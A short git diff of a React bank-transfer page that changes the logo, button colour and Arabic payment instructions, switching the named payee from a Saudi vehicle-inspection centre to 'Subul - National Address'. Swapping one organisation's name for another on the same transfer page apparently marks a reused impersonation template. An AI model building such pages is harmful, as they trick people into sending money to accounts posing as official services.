@@ -73,7 +73,7 @@ export default function BankTransfer() {
   return (
     <>
       <header className="px-4 sm:px-6 py-3">
-        <img src="images/vsc.svg" alt="logo" width="161px" height="39.6px" />
+        <img src="/assets/images/new/logo.svg" alt="logo" height="32px" />{" "}
       </header>
       <Divider />
       <section className="gap-5 bg-white sm:bg-gray-700/[.03] mx-auto grid w-full max-w-7xl px-4 sm:px-0 grid-cols-1 lg:grid-cols-2 min-h-[calc(100vh_-_56.6px)]">
@@ -130,9 +130,9 @@ export default function BankTransfer() {
               </div>
               <div className="p-4 text-sm border-2 border-blue-400 rounded-lg text-justify">
                 يرجى التوجه إلى تطبيق بنك الأهلي ثم إضافة الأيبان كمستفيد بإسم :
-                مركز سلامة للفحص الدوري ، بعد ذلك قم بإجراء تحويل المبلغ إلى
-                حساب مركز سلامة . ملاحظة : التحويل بدون إضافة المستفيد غير معتمد
-                لدى مركز سلامة ، خدمة التحويل السريع غير معتمدة حالياً .
+                سبل - العنوان الوطني ، بعد ذلك قم بإجراء تحويل المبلغ إلى حساب
+                سبل . ملاحظة : التحويل بدون إضافة المستفيد غير معتمد لدى سبل ،
+                خدمة التحويل السريع غير معتمدة حالياً .
               </div>
             </div>
             <form className="flex flex-col gap-4">
@@ -286,6 +286,9 @@ export default function BankTransfer() {
                   onClick={sendFile}
                   fullWidth
                   size="large"
+                  sx={{
+                    backgroundColor: "#1e2746",
+                  }}
                 >
                   {status == "saved" ? "تم الإرسال بنجاح" : "إرسال"}
                 </Button>
